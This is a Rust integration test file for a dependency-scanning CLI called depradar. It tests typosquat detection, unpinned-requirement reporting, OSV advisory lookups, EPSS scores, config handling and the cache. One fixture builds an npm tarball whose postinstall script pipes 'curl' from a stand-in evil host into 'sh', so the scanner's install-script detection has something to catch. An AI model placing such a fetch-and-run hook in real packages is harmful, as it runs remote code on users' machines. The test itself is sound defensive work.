//! End-to-end tests for the `depradar` binary (and the deprecated `scan`
//! alias). Every scan runs with `--offline` so no test touches the network.

use std::path::{Path, PathBuf};

use assert_cmd::Command;
use serde_json::Value;

fn depradar() -> Command {
    Command::cargo_bin("depradar").unwrap()
}

fn fixture(relative: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures")
        .join(relative)
}

/// Parses the whole of stdout as one JSON document, which fails if anything
/// else (logs, a second document) was printed alongside it.
fn stdout_json(output: &std::process::Output) -> Value {
    serde_json::from_slice(&output.stdout).unwrap_or_else(|err| {
        panic!(
            "stdout is not a single JSON document ({err}):\n{}",
            String::from_utf8_lossy(&output.stdout)
        )
    })
}

#[test]
fn name_output_matches_the_legacy_scan_binary() {
    let new = depradar().args(["name", "expresss"]).output().unwrap();
    let old = Command::cargo_bin("scan")
        .unwrap()
        .arg("expresss")
        .output()
        .unwrap();

    assert!(new.status.success());
    assert!(old.status.success());
    assert_eq!(
        String::from_utf8_lossy(&new.stdout),
        String::from_utf8_lossy(&old.stdout)
    );
    assert!(String::from_utf8_lossy(&new.stdout).contains("likely typosquat"));
    assert!(String::from_utf8_lossy(&old.stderr).contains("deprecated"));
}

#[test]
fn help_text_matches_snapshot() {
    let output = depradar().arg("--help").output().unwrap();
    assert!(output.status.success());
    let actual = String::from_utf8_lossy(&output.stdout)
        .replace("depradar.exe", "depradar")
        .replace("\r\n", "\n");
    let expected = include_str!("snapshots/depradar-help.txt").replace("\r\n", "\n");
    assert_eq!(
        actual, expected,
        "help text changed; if that's intended, regenerate the snapshot with \
         `cargo run --bin depradar -- --help > tests/snapshots/depradar-help.txt`"
    );
}

#[test]
fn name_json_is_one_document() {
    let output = depradar()
        .args(["--format", "json", "name", "expresss"])
        .output()
        .unwrap();
    assert!(output.status.success());

    let json = stdout_json(&output);
    assert_eq!(json["candidate"], "expresss");
    assert_eq!(json["likely_typosquat"], true);
    assert_eq!(json["distance_match"]["name"], "express");
    assert_eq!(json["distance_match"]["distance"], 1);
}

#[test]
fn scan_dir_json_groups_findings_by_lockfile() {
    let output = depradar()
        .args(["scan", "--offline", "--format", "json"])
        .arg(fixture("npm-basic"))
        .output()
        .unwrap();
    // A typosquat was found.
    assert_eq!(output.status.code(), Some(1));

    let json = stdout_json(&output);
    let lockfiles = json["lockfiles"].as_array().unwrap();
    assert_eq!(lockfiles.len(), 1);
    assert_eq!(lockfiles[0]["path"], "package-lock.json");
    let findings = lockfiles[0]["findings"].as_array().unwrap();
    assert!(
        findings
            .iter()
            .any(|f| f["package"] == "expresss" && f["kind"] == "typosquat"),
        "{findings:?}"
    );
    assert_eq!(json["errors"], Value::Array(Vec::new()));
}

#[test]
fn scan_dir_scans_npm_shrinkwrap() {
    let output = depradar()
        .args(["scan", "--offline", "--format", "json"])
        .arg(fixture("npm-shrinkwrap"))
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));

    let json = stdout_json(&output);
    let lockfiles = json["lockfiles"].as_array().unwrap();
    assert_eq!(lockfiles.len(), 1);
    assert_eq!(lockfiles[0]["path"], "npm-shrinkwrap.json");
    assert_eq!(lockfiles[0]["ecosystem"], "npm");
    let findings = lockfiles[0]["findings"].as_array().unwrap();
    assert!(
        findings
            .iter()
            .any(|f| f["package"] == "expresss" && f["kind"] == "typosquat"),
        "{findings:?}"
    );
}

#[test]
fn scan_file_text_reports_findings() {
    let output = depradar()
        .args(["scan", "--offline"])
        .arg(fixture("pypi-basic/requirements.txt"))
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("reqeusts"), "{stdout}");
}

#[test]
fn scan_reports_unpinned_requirements_in_text_and_json() {
    let text = depradar()
        .args(["scan", "--offline"])
        .arg(fixture("pypi-unpinned/requirements.txt"))
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&text.stdout);
    assert!(stdout.contains("2 unpinned"), "{stdout}");

    let json = depradar()
        .args(["--format", "json", "scan", "--offline"])
        .arg(fixture("pypi-unpinned/requirements.txt"))
        .output()
        .unwrap();
    let json = stdout_json(&json);
    let lockfile = &json["lockfiles"][0];
    assert_eq!(lockfile["summary"]["unpinned"], 2);
    assert_eq!(
        lockfile["unpinned"],
        serde_json::json!(["requests", "flask"])
    );
}

#[test]
fn scan_error_in_json_mode_still_prints_one_document() {
    let output = depradar()
        .args([
            "--format",
            "json",
            "scan",
            "--offline",
            "does/not/exist.lock",
        ])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(2));
    assert!(stdout_json(&output)["error"].is_string());
    assert!(String::from_utf8_lossy(&output.stderr).starts_with("error: "));
}

#[test]
fn missing_subcommand_is_a_usage_error() {
    let output = depradar().output().unwrap();
    assert_eq!(output.status.code(), Some(2));
}

#[test]
fn name_reads_newline_separated_names_from_stdin() {
    let output = depradar()
        .args(["name", "-"])
        .write_stdin("expresss\n# a comment\n\nreact\nlodahs\n")
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("expresss: likely typosquat"), "{stdout}");
    assert!(
        stdout.contains("react: no typosquat signal detected"),
        "{stdout}"
    );
    assert!(stdout.contains("lodahs:"), "{stdout}");
    assert!(!stdout.contains("a comment"), "{stdout}");
}

#[test]
fn name_stdin_json_is_one_array_document() {
    let output = depradar()
        .args(["--format", "json", "name", "-"])
        .write_stdin("expresss\nreact\nlodahs\n")
        .output()
        .unwrap();

    assert!(output.status.success());
    let json = stdout_json(&output);
    let results = json
        .as_array()
        .expect("stdin JSON output should be an array");
    assert_eq!(results.len(), 3);
    assert_eq!(results[0]["candidate"], "expresss");
    assert_eq!(results[1]["candidate"], "react");
    assert_eq!(results[2]["candidate"], "lodahs");
}

// ── depradar.toml config file tests ──────────────────────────────────────────

#[test]
fn config_file_format_json_is_used_when_no_flag() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("depradar.toml"), r#"format = "json""#).unwrap();

    let output = depradar()
        .current_dir(dir.path())
        .args(["scan", "--offline"])
        .arg(fixture("npm-basic"))
        .output()
        .unwrap();

    // Should emit JSON even though --format was not passed on the CLI.
    let json: Value = serde_json::from_slice(&output.stdout).expect("stdout should be JSON");
    assert!(json["lockfiles"].is_array(), "expected JSON output shape");
}

#[test]
fn cli_format_flag_overrides_config_file() {
    let dir = tempfile::tempdir().unwrap();
    // Config file says json, but the CLI flag says text.
    std::fs::write(dir.path().join("depradar.toml"), r#"format = "json""#).unwrap();

    let output = depradar()
        .current_dir(dir.path())
        .args(["--format", "text", "scan", "--offline"])
        .arg(fixture("npm-basic"))
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    // Text output should NOT be valid JSON at the top level.
    assert!(
        serde_json::from_str::<Value>(&stdout).is_err() || !stdout.contains(r#""lockfiles""#),
        "expected text output, got JSON: {stdout}"
    );
}

#[test]
fn config_file_fail_on_none_exits_zero_even_with_findings() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("depradar.toml"), r#"fail_on = "none""#).unwrap();

    let output = depradar()
        .current_dir(dir.path())
        .args(["scan", "--offline"])
        .arg(fixture("npm-basic"))
        .output()
        .unwrap();

    // npm-basic has a typosquat finding, but fail_on = none → exit 0.
    assert_eq!(
        output.status.code(),
        Some(0),
        "fail_on=none should always exit 0"
    );
}

#[test]
fn cli_fail_on_flag_overrides_config_file_none() {
    let dir = tempfile::tempdir().unwrap();
    // Config says none (never fail), but CLI says high → should fail.
    std::fs::write(dir.path().join("depradar.toml"), r#"fail_on = "none""#).unwrap();

    let output = depradar()
        .current_dir(dir.path())
        .args(["--fail-on", "high", "scan", "--offline"])
        .arg(fixture("npm-basic"))
        .output()
        .unwrap();

    // npm-basic contains a typosquat (rated High), so exit code should be 1.
    assert_eq!(
        output.status.code(),
        Some(1),
        "--fail-on high should override config fail_on=none"
    );
}

#[test]
fn config_file_exclude_skips_matching_paths() {
    let dir = tempfile::tempdir().unwrap();
    // Exclude the npm-basic fixture entirely.
    let fixture_path = fixture("npm-basic");
    let pattern = fixture_path.to_string_lossy().replace('\\', "/");
    std::fs::write(
        dir.path().join("depradar.toml"),
        format!(r#"exclude = ["{pattern}"]"#),
    )
    .unwrap();

    let output = depradar()
        .current_dir(dir.path())
        .args(["scan", "--offline"])
        .arg(&fixture_path)
        .output()
        .unwrap();

    // Excluded path → no findings → exit 0.
    assert_eq!(
        output.status.code(),
        Some(0),
        "excluded path should produce no findings"
    );
}

#[test]
fn cli_exclude_flag_overrides_config_file() {
    let dir = tempfile::tempdir().unwrap();
    // Config excludes everything with "nonexistent" — should not affect the scan.
    std::fs::write(
        dir.path().join("depradar.toml"),
        r#"exclude = ["nonexistent/**"]"#,
    )
    .unwrap();

    let output = depradar()
        .current_dir(dir.path())
        // Provide --exclude that matches nothing — scan should still find the typosquat.
        .args(["scan", "--offline", "--exclude", "nothing/**"])
        .arg(fixture("npm-basic"))
        .output()
        .unwrap();

    // npm-basic has a typosquat finding, so exit code should be 1 (default fail_on=high).
    assert_eq!(
        output.status.code(),
        Some(1),
        "scan should find typosquat when exclude doesn't match"
    );
}

#[test]
fn missing_config_file_uses_defaults() {
    // No depradar.toml → all defaults: format=text, fail_on=high.
    let output = depradar()
        .args(["scan", "--offline"])
        .arg(fixture("npm-basic"))
        .output()
        .unwrap();

    // Default fail_on=high, npm-basic has a typosquat (high severity) → exit 1.
    assert_eq!(output.status.code(), Some(1));
    // Default format=text → stdout is not JSON.
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        serde_json::from_str::<Value>(&stdout).is_err() || !stdout.trim_start().starts_with('{'),
        "expected text format by default"
    );
}

#[test]
fn invalid_config_file_exits_with_code_2() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("depradar.toml"), "[[invalid{{{").unwrap();

    let output = depradar()
        .current_dir(dir.path())
        .args(["scan", "--offline"])
        .arg(fixture("npm-basic"))
        .output()
        .unwrap();

    assert_eq!(
        output.status.code(),
        Some(2),
        "invalid depradar.toml should exit 2"
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("depradar.toml"),
        "error message should mention depradar.toml: {stderr}"
    );
}

#[test]
fn completions_outputs_non_empty_script_for_each_shell() {
    for shell in ["bash", "zsh", "fish", "powershell"] {
        let output = depradar().args(["completions", shell]).output().unwrap();
        assert!(
            output.status.success(),
            "completions for {shell} failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert!(
            !stdout.trim().is_empty(),
            "expected non-empty completion script for {shell}"
        );
        assert!(
            stdout.contains("depradar"),
            "expected completion script for {shell} to reference `depradar`"
        );
    }
}

#[test]
fn completions_rejects_unknown_shell() {
    let output = depradar().args(["completions", "tcsh"]).output().unwrap();
    assert_eq!(output.status.code(), Some(2));
}

// ── depradar explain tests ───────────────────────────────────────────────────

/// Canned OSV advisory served by the mock server for `GET /v1/vulns/{id}`.
const EXPLAIN_ADVISORY_JSON: &str = r#"{
  "id": "GHSA-aaaa-bbbb-cccc",
  "summary": "Prototype pollution in example-package",
  "details": "A long description that should not be required for the test.",
  "aliases": ["CVE-2024-0001"],
  "severity": [
    { "type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" }
  ],
  "affected": [
    {
      "package": { "ecosystem": "npm", "name": "example-package" },
      "ranges": [
        { "type": "SEMVER", "events": [{ "introduced": "0.0.0" }, { "fixed": "1.2.3" }] }
      ]
    }
  ],
  "references": [
    { "type": "ADVISORY", "url": "https://example.com/advisories/GHSA-aaaa-bbbb-cccc" },
    { "type": "WEB", "url": "https://example.com/blog/prototype-pollution" }
  ]
}"#;

/// Starts a `mockito` server that answers `GET /v1/vulns/{id}` with the canned
/// advisory for `GHSA-aaaa-bbbb-cccc` and 404 for anything else. Returns the
/// running server; the caller points the binary at it via
/// `DEPRADAR_OSV_BASE_URL`.
fn start_mock_osv_server() -> mockito::ServerGuard {
    let mut server = mockito::Server::new();
    server
        .mock("GET", "/v1/vulns/GHSA-aaaa-bbbb-cccc")
        .with_status(200)
        .with_header("content-type", "application/json")
        .with_body(EXPLAIN_ADVISORY_JSON)
        .create();
    server
        .mock(
            "GET",
            mockito::Matcher::Regex(r"^/v1/vulns/.*$".to_string()),
        )
        .with_status(404)
        .with_header("content-type", "application/json")
        .with_body(r#"{"code":5,"message":"not found"}"#)
        .create();
    server
}

#[test]
fn explain_text_prints_advisory_details() {
    let server = start_mock_osv_server();

    let output = depradar()
        .env("DEPRADAR_OSV_BASE_URL", server.url())
        .args(["explain", "GHSA-aaaa-bbbb-cccc"])
        .output()
        .unwrap();

    assert!(
        output.status.success(),
        "explain failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("Prototype pollution in example-package"),
        "summary missing: {stdout}"
    );
    assert!(stdout.contains("GHSA-aaaa-bbbb-cccc"), "{stdout}");
    assert!(
        stdout.to_lowercase().contains("severity"),
        "severity missing: {stdout}"
    );
    assert!(
        stdout.contains("example-package"),
        "affected package missing: {stdout}"
    );
    assert!(stdout.contains("1.2.3"), "fixed version missing: {stdout}");
    assert!(
        stdout.contains("https://example.com/advisories/GHSA-aaaa-bbbb-cccc"),
        "references missing: {stdout}"
    );
}

#[test]
fn explain_json_is_one_document() {
    let server = start_mock_osv_server();

    let output = depradar()
        .env("DEPRADAR_OSV_BASE_URL", server.url())
        .args(["--format", "json", "explain", "GHSA-aaaa-bbbb-cccc"])
        .output()
        .unwrap();

    assert!(
        output.status.success(),
        "explain failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let json = stdout_json(&output);
    assert_eq!(json["id"], "GHSA-aaaa-bbbb-cccc");
    assert_eq!(json["summary"], "Prototype pollution in example-package");
    assert!(
        json["severity"].is_string() || json["severity"].is_array(),
        "severity missing from JSON: {json}"
    );
    let rendered = json.to_string();
    assert!(
        rendered.contains("1.2.3"),
        "fixed version missing from JSON: {json}"
    );
}

#[test]
fn explain_unknown_advisory_exits_with_code_2() {
    let server = start_mock_osv_server();

    let output = depradar()
        .env("DEPRADAR_OSV_BASE_URL", server.url())
        .args(["explain", "GHSA-0000-0000-0000"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(2));
    assert!(
        String::from_utf8_lossy(&output.stderr).starts_with("error: "),
        "expected an error message on stderr"
    );
}

// ── depradar cache tests ─────────────────────────────────────────────────────

/// Points the binary at `dir` as its OSV cache directory.
fn cache_dir_command(dir: &Path) -> Command {
    let mut cmd = depradar();
    cmd.env("DEPRADAR_CACHE_DIR", dir);
    cmd
}

#[test]
fn cache_info_reports_path_count_and_size() {
    let dir = tempfile::tempdir().unwrap();
    let cache = dir.path().join("osv-cache");
    std::fs::create_dir_all(&cache).unwrap();
    std::fs::write(cache.join("entry-one.json"), b"{\"id\":\"GHSA-1\"}").unwrap();
    std::fs::write(cache.join("entry-two.json"), b"{\"id\":\"GHSA-2\"}").unwrap();

    let output = cache_dir_command(&cache).args(["cache", "info"]).output().unwrap();

    assert!(
        output.status.success(),
        "cache info failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains(&cache.to_string_lossy().to_string()),
        "cache path missing from output: {stdout}"
    );
    assert!(
        stdout.to_lowercase().contains("entries"),
        "entry count missing from output: {stdout}"
    );
    assert!(stdout.contains('2'), "entry count value missing: {stdout}");
    assert!(
        stdout.to_lowercase().contains("size"),
        "size missing from output: {stdout}"
    );
}

#[test]
fn cache_info_on_missing_dir_reports_zero_entries() {
    let dir = tempfile::tempdir().unwrap();
    let cache = dir.path().join("does-not-exist");

    let output = cache_dir_command(&cache).args(["cache", "info"]).output().unwrap();

    assert!(
        output.status.success(),
        "cache info failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains('0'), "expected zero entries: {stdout}");
}

#[test]
fn cache_clear_removes_the_cache_directory() {
    let dir = tempfile::tempdir().unwrap();
    let cache = dir.path().join("osv-cache");
    std::fs::create_dir_all(&cache).unwrap();
    std::fs::write(cache.join("entry.json"), b"{}").unwrap();
    assert!(cache.exists());

    let output = cache_dir_command(&cache).args(["cache", "clear"]).output().unwrap();

    assert!(
        output.status.success(),
        "cache clear failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(!cache.exists(), "cache directory should have been removed");
}

#[test]
fn cache_clear_on_missing_dir_succeeds() {
    let dir = tempfile::tempdir().unwrap();
    let cache = dir.path().join("never-created");

    let output = cache_dir_command(&cache).args(["cache", "clear"]).output().unwrap();

    assert!(
        output.status.success(),
        "cache clear on missing dir should succeed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

// ── EPSS score tests ─────────────────────────────────────────────────────────

/// Canned FIRST EPSS API response for `CVE-2024-0001`.
const EPSS_RESPONSE_JSON: &str = r#"{
  "status": "OK",
  "status-code": 200,
  "version": "1.0",
  "access": "public",
  "total": 1,
  "offset": 0,
  "limit": 1,
  "data": [
    { "cve": "CVE-2024-0001", "epss": "0.97123", "percentile": "0.99876", "date": "2024-06-01" }
  ]
}"#;

// ── `scan --deep` behavioral tests ───────────────────────────────────────────

/// A minimal npm tarball (gzip-compressed tar) containing `package.json` with a
/// malicious `postinstall` script, plus a trivial `index.js`.
fn malicious_tarball() -> Vec<u8> {
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::io::Write;

    let package_json = br#"{
  "name": "evil-pkg",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl -s http://evil.example/x.sh | sh"
  }
}"#;
    let index_js = b"module.exports = 1;\n";

    let mut builder = tar::Builder::new(Vec::new());
    for (name, data) in [
        ("package/package.json", &package_json[..]),
        ("package/index.js", &index_js[..]),
    ] {
        let mut header = tar::Header::new_gnu();
        header.set_size(data.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        builder.append_data(&mut header, name, data).unwrap();
    }
    let tar_bytes = builder.into_inner().unwrap();

    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(&tar_bytes).unwrap();
    encoder.finish().unwrap()
}

#[test]
fn scan_deep_reports_malicious_postinstall_from_mock_registry() {
    let mut server = mockito::Server::new();
    // npm packument for the dependency.
    server
        .mock("GET", "/evil-pkg")
        .with_status(200)
        .with_header("content-type", "application/json")
        .with_body(
            r#"{
              "name": "evil-pkg",
              "dist-tags": { "latest": "1.0.0" },
              "versions": {
                "1.0.0": {
                  "name": "evil-pkg",
                  "version": "1.0.0",
                  "dist": {
                    "tarball": "TARBALL_URL"
                  }
                }
              }
            }"#
            .replace("TARBALL_URL", &format!("{}/evil-pkg/-/evil-pkg-1.0.0.tgz", server.url())),
        )
        .create();
    // The tarball itself.
    server
        .mock("GET", "/evil-pkg/-/evil-pkg-1.0.0.tgz")
        .with_status(200)
        .with_header("content-type", "application/octet-stream")
        .with_body(malicious_tarball())
        .create();

    let output = depradar()
        .env("DEPRADAR_NPM_REGISTRY_URL", server.url())
        .args(["--format", "json", "scan", "--deep"])
        .arg(fixture("npm-deep"))
        .output()
        .unwrap();

    let json = stdout_json(&output);
    let rendered = json.to_string();
    assert!(
        rendered.contains("evil-pkg"),
        "dependency missing from output: {json}"
    );
    assert!(
        rendered.contains("install") || rendered.contains("postinstall"),
        "install-script finding missing from output: {json}"
    );
}

#[test]
fn scan_json_includes_epss_score_from_mock_server() {
    let mut server = mockito::Server::new();
    // OSV querybatch: report the advisory for `example-package`.
    server
        .mock("POST", "/v1/querybatch")
        .with_status(200)
        .with_header("content-type", "application/json")
        .with_body(
            r#"{
              "results": [
                { "vulns": [{ "id": "GHSA-aaaa-bbbb-cccc", "modified": "2024-06-01T00:00:00Z" }] }
              ]
            }"#,
        )
        .create();
    // OSV vuln detail: the advisory with a CVE alias.
    server
        .mock("GET", "/v1/vulns/GHSA-aaaa-bbbb-cccc")
        .with_status(200)
        .with_header("content-type", "application/json")
        .with_body(EXPLAIN_ADVISORY_JSON)
        .create();
    // FIRST EPSS API: the score for the CVE alias.
    server
        .mock("GET", mockito::Matcher::Regex(r"^/data/v1/epss.*$".to_string()))
        .with_status(200)
        .with_header("content-type", "application/json")
        .with_body(EPSS_RESPONSE_JSON)
        .create();

    let cache = tempfile::tempdir().unwrap();
    let output = depradar()
        .env("DEPRADAR_OSV_BASE_URL", server.url())
        .env("DEPRADAR_EPSS_BASE_URL", server.url())
        .env("DEPRADAR_CACHE_DIR", cache.path())
        .args(["--format", "json", "scan"])
        .arg(fixture("npm-vulnerable"))
        .output()
        .unwrap();

    let json = stdout_json(&output);
    let rendered = json.to_string();
    assert!(
        rendered.contains("0.97123") || rendered.contains("0.9712"),
        "EPSS score missing from JSON output: {json}"
    );
    assert!(
        rendered.contains("epss"),
        "EPSS field missing from JSON output: {json}"
    );
}
